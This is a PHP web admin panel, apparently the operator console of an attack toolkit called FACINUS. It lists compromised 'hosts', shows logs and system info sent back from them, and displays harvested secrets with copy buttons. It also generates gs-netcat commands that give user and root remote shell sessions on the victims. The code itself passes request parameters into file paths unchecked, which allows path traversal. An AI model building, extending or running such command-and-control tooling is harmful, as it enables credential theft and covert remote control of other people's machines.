<?php
// FACINUS Admin Panel
// This file allows viewing logs and connection information from deployed clients

// Session and authentication
session_start();
$admin_password = "ADMIN_PASSWORD_PLACEHOLDER"; // Will be replaced during installation

// Handle login
if (isset($_POST['password'])) {
    if ($_POST['password'] === $admin_password) {
        $_SESSION['authenticated'] = true;
    } else {
        $login_error = "Invalid password";
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Check authentication
$authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

// Directories
$logs_dir = __DIR__ . "/logs";
$secrets_dir = __DIR__ . "/secrets";

// Get list of hosts (each subdirectory in logs_dir is a host)
$hosts = [];
if ($authenticated && is_dir($logs_dir)) {
    $dir_content = scandir($logs_dir);
    foreach ($dir_content as $item) {
        if ($item != "." && $item != ".." && is_dir($logs_dir . "/" . $item)) {
            $hosts[] = $item;
        }
    }
}

// View specific log if requested
$current_log = null;
$log_content = "";
if ($authenticated && isset($_GET['log'])) {
    $log_path = $logs_dir . "/" . $_GET['host'] . "/" . $_GET['log'];
    if (file_exists($log_path) && is_file($log_path)) {
        $current_log = $_GET['log'];
        $log_content = file_get_contents($log_path);
    }
}

// View system info if requested
$system_info = null;
if ($authenticated && isset($_GET['info']) && $_GET['info'] === 'system') {
    $info_path = $logs_dir . "/" . $_GET['host'] . "/system_info.json";
    if (file_exists($info_path) && is_file($info_path)) {
        $system_info = json_decode(file_get_contents($info_path), true);
    }
}

// View secrets if requested
$secrets = [];
if ($authenticated && isset($_GET['secrets']) && $_GET['host']) {
    $host_secrets_dir = $secrets_dir . "/" . $_GET['host'];
    if (is_dir($host_secrets_dir)) {
        $secret_files = scandir($host_secrets_dir);
        foreach ($secret_files as $file) {
            if ($file != "." && $file != ".." && is_file($host_secrets_dir . "/" . $file)) {
                $type = pathinfo($file, PATHINFO_FILENAME);
                $value = file_get_contents($host_secrets_dir . "/" . $file);
                $secrets[$type] = $value;
            }
        }
    }
}

// For gsocket shell access
$shell_mode = false;
if ($authenticated && isset($_GET['shell']) && $_GET['host']) {
    $shell_mode = true;
}

// Get logs for a specific host if requested
$host_logs = [];
if ($authenticated && isset($_GET['host'])) {
    $host_logs_dir = $logs_dir . "/" . $_GET['host'];
    if (is_dir($host_logs_dir)) {
        $log_files = scandir($host_logs_dir);
        foreach ($log_files as $file) {
            if ($file != "." && $file != ".." && is_file($host_logs_dir . "/" . $file)) {
                $host_logs[] = $file;
            }
        }
    }
    // Sort logs by most recent first
    usort($host_logs, function($a, $b) use ($logs_dir) {
        return filemtime($logs_dir . "/" . $_GET['host'] . "/" . $b) - 
               filemtime($logs_dir . "/" . $_GET['host'] . "/" . $a);
    });
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FACINUS - Admin</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg: #111111;
            --text: #33ff33;
            --text-dim: #1a991a;
            --secondary: #aaaaaa;
            --accent: #ff5555;
            --border: #333333;
            --hover: #222222;
            --panel: #191919;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background-color: var(--bg);
            color: var(--text);
            line-height: 1.5;
        }
        
        .container {
            width: 95%;
            max-width: 1400px;
            margin: 0 auto;
            padding: 10px;
        }
        
        .header {
            border-bottom: 1px solid var(--border);
            padding: 10px 0;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        pre {
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            white-space: pre;
        }
        
        .ascii-header {
            font-size: 12px;
            line-height: 1.2;
        }
        
        .logout {
            color: var(--text);
            text-decoration: none;
            border: 1px solid var(--border);
            padding: 5px 10px;
        }
        
        .logout:hover {
            background: var(--hover);
        }
        
        .dashboard {
            display: flex;
            gap: 20px;
        }
        
        .sidebar {
            width: 280px;
            flex-shrink: 0;
        }
        
        .content {
            flex-grow: 1;
        }
        
        .panel {
            border: 1px solid var(--border);
            background: var(--panel);
            margin-bottom: 20px;
        }
        
        .panel-header {
            border-bottom: 1px solid var(--border);
            padding: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .host-list, .log-list {
            list-style: none;
        }
        
        .host-list a, .log-list a, .tab {
            display: block;
            padding: 8px 10px;
            color: var(--secondary);
            text-decoration: none;
            border-bottom: 1px solid var(--border);
        }
        
        .host-list a:hover, .log-list a:hover, .tab:hover {
            background: var(--hover);
            color: var(--text);
        }
        
        .host-list a.active, .log-list a.active, .tab.active {
            color: var(--text);
            background: rgba(51, 255, 51, 0.1);
        }
        
        .tabs {
            display: flex;
            border-bottom: 1px solid var(--border);
        }
        
        .tab {
            padding: 8px 15px;
            border-right: 1px solid var(--border);
            border-bottom: none;
        }
        
        .logs {
            padding: 10px;
            max-height: 600px;
            overflow: auto;
            white-space: pre-wrap;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            background: rgba(0, 0, 0, 0.2);
        }
        
        .log-date {
            float: right;
            color: var(--text-dim);
            font-size: 0.9em;
        }
        
        .login {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            border: 1px solid var(--border);
            background: var(--panel);
        }
        
        input[type="password"] {
            width: 100%;
            padding: 8px;
            margin: 10px 0;
            background: var(--bg);
            border: 1px solid var(--border);
            color: var(--text);
            font-family: 'Courier New', monospace;
        }
        
        button, .button {
            padding: 8px 15px;
            background: transparent;
            color: var(--text);
            border: 1px solid var(--text);
            cursor: pointer;
            font-family: 'Courier New', monospace;
            width: 100%;
        }
        
        button:hover, .button:hover {
            background: rgba(51, 255, 51, 0.1);
        }
        
        .welcome {
            text-align: center;
            padding: 50px 20px;
            color: var(--secondary);
        }
        
        .secrets {
            padding: 10px;
            max-width: 800px;
            margin: 0 auto;/
        }

        .secret {
            margin-bottom: 15px;
            padding: 8px;
            border: 1px solid var(--border);
            background: rgba(255, 255, 0, 0.05);
            border-radius: 3px;
        }

        .secret-title {
            margin-bottom: 8px;
            border-bottom: 1px dashed var(--border);
            padding-bottom: 4px;
            font-size: 0.9em;
            color: var(--text-dim);
        }
        
        .command {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid var(--border);
            padding: 10px;
            margin: 10px 0;
            position: relative;
            overflow-x: auto;
            white-space: pre;
            font-family: 'Courier New', monospace;
        }

        .secret .command {
            margin: 5px 0;
            padding: 8px;
            font-size: 0.9em;
            line-height: 1.4;
        }
        
        .copy-btn {
            position: absolute;
            right: 5px;
            top: 5px;
            background: transparent;
            color: var(--secondary);
            border: 1px solid var(--border);
            padding: 2px 5px;
            cursor: pointer;
            font-size: 12px;
            width: auto;
            font-family: 'Courier New', monospace;
        }
        
        .copy-btn:hover {
            background: var(--hover);
            color: var(--text);
        }
        
        .alert {
            border-left: 3px solid var(--accent);
            padding: 10px;
            margin-bottom: 15px;
            color: var(--accent);
        }
        
        .terminal {
            height: 500px;
            background: #000;
            color: var(--text);
            padding: 10px;
            overflow: auto;
            font-family: 'Courier New', monospace;
            margin-top: 10px;
        }
        
        .terminal-input {
            background: transparent;
            border: none;
            color: var(--text);
            width: 100%;
            font-family: 'Courier New', monospace;
            outline: none;
            padding: 5px 0;
        }
        
        .gs-command {
            margin: 10px 0;
        }
        
        .info-table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .info-table tr {
            border-bottom: 1px solid var(--border);
        }
        
        .info-table td {
            padding: 8px 10px;
        }
        
        .info-label {
            color: var(--secondary);
            width: 150px;
        }
        
        @media (max-width: 800px) {
            .dashboard {
                flex-direction: column;
            }
            
            .sidebar {
                width: 100%;
            }
            
            .ascii-header {
                font-size: 10px;
            }
            
            .tabs {
                flex-wrap: wrap;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="ascii-header">
<pre>
  █████▒▄▄▄       ▄████▄   ██▓ ███▄    █  █    ██   ██████ 
▓██   ▒▒████▄    ▒██▀ ▀█  ▓██▒ ██ ▀█   █  ██  ▓██▒▒██    ▒ 
▒████ ░▒██  ▀█▄  ▒▓█    ▄ ▒██▒▓██  ▀█ ██▒▓██  ▒██░░ ▓██▄   
░▓█▒  ░░██▄▄▄▄██ ▒▓▓▄ ▄██▒░██░▓██▒  ▐▌██▒▓▓█  ░██░  ▒   ██▒
░▒█░    ▓█   ▓██▒▒ ▓███▀ ░░██░▒██░   ▓██░▒▒█████▓ ▒██████▒▒
 ▒ ░    ▒▒   ▓▒█░░ ░▒ ▒  ░░▓  ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
 ░       ▒   ▒▒ ░  ░  ▒    ▒ ░░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░
 ░ ░     ░   ▒   ░         ▒ ░   ░   ░ ░  ░░░ ░ ░ ░  ░  ░  
             ░  ░░ ░       ░           ░    ░           ░  
                 ░                                         

 admin panel
</pre>
            </div>
            <?php if ($authenticated): ?>
                <a href="?logout=1" class="logout">logout</a>
            <?php endif; ?>
        </div>

        <?php if (!$authenticated): ?>
            <div class="login">
                <h2>> login</h2>
                <?php if (isset($login_error)): ?>
                    <div class="alert"><?php echo $login_error; ?></div>
                <?php endif; ?>
                <form method="post">
                    <label for="password">password:</label>
                    <input type="password" id="password" name="password" required autofocus>
                    <button type="submit">access</button>
                </form>
            </div>
        <?php else: ?>
            <div class="dashboard">
                <div class="sidebar">
                    <div class="panel">
                        <div class="panel-header">
                            <h3>> hosts</h3>
                        </div>
                        <?php if (count($hosts) > 0): ?>
                            <ul class="host-list">
                                <?php foreach ($hosts as $host): ?>
                                    <li>
                                        <a href="?host=<?php echo urlencode($host); ?>" class="<?php echo isset($_GET['host']) && $_GET['host'] === $host ? 'active' : ''; ?>">
                                            <?php echo htmlspecialchars($host); ?>
                                        </a>
                                    </li>
                                <?php endforeach; ?>
                            </ul>
                        <?php else: ?>
                            <div class="welcome">
                                <p>no connected hosts</p>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
                
                <div class="content">
                    <?php if (isset($_GET['host'])): ?>
                        <div class="panel">
                            <div class="panel-header">
                                <h2>> <?php echo htmlspecialchars($_GET['host']); ?></h2>
                            </div>
                            
                            <div class="tabs">
                                <a href="?host=<?php echo urlencode($_GET['host']); ?>" class="tab <?php echo !isset($_GET['info']) && !isset($_GET['secrets']) && !isset($_GET['shell']) ? 'active' : ''; ?>">
                                    logs
                                </a>
                                <a href="?host=<?php echo urlencode($_GET['host']); ?>&info=system" class="tab <?php echo isset($_GET['info']) && $_GET['info'] === 'system' ? 'active' : ''; ?>">
                                    system
                                </a>
                                <a href="?host=<?php echo urlencode($_GET['host']); ?>&secrets=1" class="tab <?php echo isset($_GET['secrets']) ? 'active' : ''; ?>">
                                    secrets
                                </a>
                                <a href="?host=<?php echo urlencode($_GET['host']); ?>&shell=1" class="tab <?php echo isset($_GET['shell']) ? 'active' : ''; ?>">
                                    shell
                                </a>
                            </div>
                            
                            <?php if (isset($_GET['shell'])): ?>
                                <div style="padding: 10px;">
                                    <h3>> gsocket shell access</h3>
                                    <?php 
                                        // Check for gsocket user and root secret files
                                        $user_secret = "";
                                        $root_secret = "";
                                        if (isset($secrets['gsocket_user'])) {
                                            $user_secret = $secrets['gsocket_user'];
                                        }
                                        if (isset($secrets['gsocket_root'])) {
                                            $root_secret = $secrets['gsocket_root'];
                                        }
                                    ?>
                                    
                                    <?php if (!empty($user_secret) || !empty($root_secret)): ?>
                                        <?php if (!empty($user_secret)): ?>
                                            <div class="gs-command">
                                                <p>> user session</p>
                                                <div class="command">
                                                    gs-netcat -s <?php echo htmlspecialchars($user_secret); ?> -i
                                                    <button class="copy-btn" onclick="copyToClipboard(this)" data-clipboard="gs-netcat -s <?php echo htmlspecialchars($user_secret); ?> -i">
                                                        copy
                                                    </button>
                                                </div>
                                            </div>
                                        <?php endif; ?>
                                        
                                        <?php if (!empty($root_secret)): ?>
                                            <div class="gs-command">
                                                <p>> root session</p>
                                                <div class="command">
                                                    gs-netcat -s <?php echo htmlspecialchars($root_secret); ?> -i
                                                    <button class="copy-btn" onclick="copyToClipboard(this)" data-clipboard="gs-netcat -s <?php echo htmlspecialchars($root_secret); ?> -i">
                                                        copy
                                                    </button>
                                                </div>
                                            </div>
                                        <?php endif; ?>
                                        
                                        <div class="terminal" id="terminal">
                                            <p>$ terminal emulation (run gs-netcat commands above in your local terminal)</p>
                                            <p>$ this web console serves as a visual example only</p>
                                            <p>$ -------------------------------------------------------</p>
                                            <div id="output"></div>
                                            <div style="display: flex;">
                                                <span>$</span>
                                                <input type="text" class="terminal-input" id="terminalInput" autocomplete="off">
                                            </div>
                                        </div>
                                    <?php else: ?>
                                        <div class="welcome">
                                            <p>no gsocket secrets collected from this host</p>
                                        </div>
                                    <?php endif; ?>
                                </div>
                            <?php elseif (isset($_GET['secrets'])): ?>
                                <div class="secrets">
                                    <?php if (count($secrets) > 0): ?>
                                        <?php foreach ($secrets as $type => $value): ?>
                                            <div class="secret">
                                                <div class="secret-title">
                                                    > <?php echo htmlspecialchars(str_replace('_', ' ', $type)); ?>
                                                </div>
                                                <div class="command">
                                                    <?php echo htmlspecialchars($value); ?>
                                                    <button class="copy-btn" onclick="copyToClipboard(this)" data-clipboard="<?php echo htmlspecialchars($value); ?>">
                                                        copy
                                                    </button>
                                                </div>
                                            </div>
                                        <?php endforeach; ?>
                                    <?php else: ?>
                                        <div class="welcome">
                                            <p>no secrets collected from this host</p>
                                        </div>
                                    <?php endif; ?>
                                </div>
                            <?php elseif (isset($_GET['info']) && $_GET['info'] === 'system'): ?>
                                <div style="padding: 10px;">
                                    <?php if ($system_info): ?>
                                        <table class="info-table">
                                            <?php foreach ($system_info as $key => $value): ?>
                                                <tr>
                                                    <td class="info-label"><?php echo htmlspecialchars(str_replace('_', ' ', $key)); ?></td>
                                                    <td><?php echo htmlspecialchars($value); ?></td>
                                                </tr>
                                            <?php endforeach; ?>
                                        </table>
                                    <?php else: ?>
                                        <div class="welcome">
                                            <p>no system information collected</p>
                                        </div>
                                    <?php endif; ?>
                                </div>
                            <?php else: ?>
                                <?php if ($current_log): ?>
                                    <div class="logs">
                                        <?php echo htmlspecialchars($log_content); ?>
                                    </div>
                                <?php elseif (count($host_logs) > 0): ?>
                                    <ul class="log-list">
                                        <?php foreach ($host_logs as $log): ?>
                                            <?php 
                                                $log_time = filemtime($logs_dir . "/" . $_GET['host'] . "/" . $log);
                                                $log_date = date("Y-m-d H:i:s", $log_time);
                                            ?>
                                            <li>
                                                <a href="?host=<?php echo urlencode($_GET['host']); ?>&log=<?php echo urlencode($log); ?>">
                                                    <?php echo htmlspecialchars($log); ?>
                                                    <span class="log-date"><?php echo $log_date; ?></span>
                                                </a>
                                            </li>
                                        <?php endforeach; ?>
                                    </ul>
                                <?php else: ?>
                                    <div class="welcome">
                                        <p>no logs available</p>
                                    </div>
                                <?php endif; ?>
                            <?php endif; ?>
                        </div>
                    <?php else: ?>
                        <div class="welcome">
                            <p>select a host to view details</p>
                        </div>
                    <?php endif; ?>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <script>
        function copyToClipboard(element) {
            const text = element.getAttribute('data-clipboard');
            navigator.clipboard.writeText(text).then(function() {
                const originalText = element.innerText;
                element.innerText = "copied!";
                setTimeout(() => {
                    element.innerText = originalText;
                }, 1000);
            });
        }
        
        // Simple terminal simulation
        const terminalInput = document.getElementById('terminalInput');
        const output = document.getElementById('output');
        let commandHistory = [];
        let commandIndex = -1;
        
        if (terminalInput) {
            terminalInput.addEventListener('keydown', function(e) {
                const terminal = document.getElementById('terminal');
                
                if (e.key === 'Enter') {
                    e.preventDefault();
                    const command = terminalInput.value;
                    
                    if (command.trim() !== '') {
                        // Add command to history
                        commandHistory.push(command);
                        commandIndex = commandHistory.length;
                        
                        // Display command
                        const cmdElement = document.createElement('p');
                        cmdElement.innerHTML = `$ ${command}`;
                        output.appendChild(cmdElement);
                        
                        // Simulate response (this is just a simulation)
                        let response;
                        if (command.toLowerCase().includes('ls')) {
                            response = "index.html\nconfig.php\nassets/\n.hidden/";
                        } else if (command.toLowerCase().includes('whoami')) {
                            response = "www-data";
                        } else if (command.toLowerCase().includes('pwd')) {
                            response = "/var/www/html";
                        } else if (command.toLowerCase().includes('help')) {
                            response = "This is a simulated terminal. Use the gs-netcat command in your real terminal for actual access.";
                        } else {
                            response = `Command not found: ${command}`;
                        }
                        
                        const resElement = document.createElement('p');
                        resElement.textContent = response;
                        output.appendChild(resElement);
                        
                        // Clear input
                        terminalInput.value = '';
                        
                        // Scroll to bottom
                        terminal.scrollTop = terminal.scrollHeight;
                    }
                } else if (e.key === 'ArrowUp') {
                    // Navigate command history
                    if (commandHistory.length > 0 && commandIndex > 0) {
                        commandIndex--;
                        terminalInput.value = commandHistory[commandIndex];
                        // Move cursor to end
                        setTimeout(() => {
                            terminalInput.selectionStart = terminalInput.value.length;
                            terminalInput.selectionEnd = terminalInput.value.length;
                        }, 0);
                    }
                    e.preventDefault();
                } else if (e.key === 'ArrowDown') {
                    // Navigate command history
                    if (commandIndex < commandHistory.length - 1) {
                        commandIndex++;
                        terminalInput.value = commandHistory[commandIndex];
                    } else if (commandIndex >= commandHistory.length - 1) {
                        commandIndex = commandHistory.length;
                        terminalInput.value = '';
                    }
                    e.preventDefault();
                } else if (e.key === 'Tab') {
                    // Simple tab completion (just a demo)
                    e.preventDefault();
                    const cmd = terminalInput.value;
                    
                    if (cmd.startsWith('cd ')) {
                        terminalInput.value = 'cd /var/www/';
                    } else if (cmd.startsWith('cat ')) {
                        terminalInput.value = 'cat /etc/passwd';
                    }
                }
            });
            
            // Focus terminal input when terminal is clicked
            const terminal = document.getElementById('terminal');
            if (terminal) {
                terminal.addEventListener('click', function() {
                    terminalInput.focus();
                });
            }
        }
        
        // Auto-refresh functionality for logs
        const logContent = document.querySelector('.logs');
        if (logContent) {
            // Add refresh button
            const refreshButton = document.createElement('button');
            refreshButton.innerText = 'refresh';
            refreshButton.className = 'copy-btn';
            refreshButton.style.position = 'absolute';
            refreshButton.style.top = '10px';
            refreshButton.style.right = '10px';
            
            const panelHeader = document.querySelector('.panel-header');
            if (panelHeader) {
                panelHeader.style.position = 'relative';
                panelHeader.appendChild(refreshButton);
                
                refreshButton.addEventListener('click', function() {
                    // Reload the current page
                    location.reload();
                });
            }
        }
        
        // Live search functionality for hosts and logs
        function addSearchBox(containerSelector, itemSelector) {
            const container = document.querySelector(containerSelector);
            if (!container) return;
            
            const searchBox = document.createElement('input');
            searchBox.type = 'text';
            searchBox.placeholder = 'search...';
            searchBox.style.width = '100%';
            searchBox.style.padding = '8px';
            searchBox.style.margin = '0';
            searchBox.style.background = 'var(--bg)';
            searchBox.style.border = '1px solid var(--border)';
            searchBox.style.borderWidth = '0 0 1px 0';
            searchBox.style.color = 'var(--text)';
            searchBox.style.fontFamily = "'Courier New', monospace";
            
            container.parentNode.insertBefore(searchBox, container);
            
            searchBox.addEventListener('input', function() {
                const query = this.value.toLowerCase();
                const items = document.querySelectorAll(itemSelector);
                
                items.forEach(item => {
                    const text = item.textContent.toLowerCase();
                    if (text.includes(query)) {
                        item.style.display = 'block';
                    } else {
                        item.style.display = 'none';
                    }
                });
            });
        }
        
        // Add search boxes if lists exist
        if (document.querySelector('.host-list')) {
            addSearchBox('.host-list', '.host-list li a');
        }
        
        if (document.querySelector('.log-list')) {
            addSearchBox('.log-list', '.log-list li a');
        }
        
        // Add a notification system
        function createNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = 'notification ' + type;
            notification.innerHTML = message;
            
            notification.style.position = 'fixed';
            notification.style.bottom = '20px';
            notification.style.right = '20px';
            notification.style.padding = '10px 15px';
            notification.style.background = type === 'error' ? 'rgba(255, 85, 85, 0.2)' : 'rgba(51, 255, 51, 0.1)';
            notification.style.border = '1px solid ' + (type === 'error' ? 'var(--accent)' : 'var(--text)');
            notification.style.color = type === 'error' ? 'var(--accent)' : 'var(--text)';
            notification.style.fontFamily = "'Courier New', monospace";
            notification.style.zIndex = '1000';
            notification.style.maxWidth = '300px';
            notification.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
            
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.style.opacity = '0';
                notification.style.transition = 'opacity 0.5s ease';
                setTimeout(() => {
                    document.body.removeChild(notification);
                }, 500);
            }, 3000);
        }
        
        // Example notifications (uncomment to use)
        // document.addEventListener('DOMContentLoaded', function() {
        //    createNotification('Connected to new host: server-backup-01', 'info');
        // });
        
        // Add download functionality for logs
        if (logContent) {
            const downloadButton = document.createElement('button');
            downloadButton.innerText = 'download';
            downloadButton.className = 'copy-btn';
            downloadButton.style.position = 'absolute';
            downloadButton.style.top = '10px';
            downloadButton.style.right = '80px'; // Position next to refresh button
            
            const panelHeader = document.querySelector('.panel-header');
            if (panelHeader) {
                panelHeader.appendChild(downloadButton);
                
                downloadButton.addEventListener('click', function() {
                    const content = logContent.innerText;
                    const blob = new Blob([content], {type: 'text/plain'});
                    const url = URL.createObjectURL(blob);
                    
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = '<?php echo isset($_GET["log"]) ? $_GET["log"] : "log"; ?>';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    
                    createNotification('Log file downloaded successfully', 'info');
                });
            }
        }
        
        // Enable dark mode toggle
        const darkModeToggle = document.createElement('button');
        darkModeToggle.innerText = 'toggle theme';
        darkModeToggle.className = 'copy-btn';
        darkModeToggle.style.position = 'absolute';
        darkModeToggle.style.top = '10px';
        darkModeToggle.style.right = '100px';
        darkModeToggle.style.display = 'none'; // Hidden by default, enable if you want this feature
        
        const header = document.querySelector('.header');
        if (header) {
            header.style.position = 'relative';
            header.appendChild(darkModeToggle);
            
            darkModeToggle.addEventListener('click', function() {
                const root = document.documentElement;
                const currentBg = getComputedStyle(root).getPropertyValue('--bg').trim();
                
                if (currentBg === '#111111') {
                    // Switch to light mode
                    root.style.setProperty('--bg', '#f0f0f0');
                    root.style.setProperty('--text', '#006600');
                    root.style.setProperty('--text-dim', '#004d00');
                    root.style.setProperty('--secondary', '#444444');
                    root.style.setProperty('--border', '#cccccc');
                    root.style.setProperty('--hover', '#e0e0e0');
                    root.style.setProperty('--panel', '#ffffff');
                } else {
                    // Switch to dark mode
                    root.style.setProperty('--bg', '#111111');
                    root.style.setProperty('--text', '#33ff33');
                    root.style.setProperty('--text-dim', '#1a991a');
                    root.style.setProperty('--secondary', '#aaaaaa');
                    root.style.setProperty('--border', '#333333');
                    root.style.setProperty('--hover', '#222222');
                    root.style.setProperty('--panel', '#191919');
                }
            });
        }
    </script>
</body>
</html>
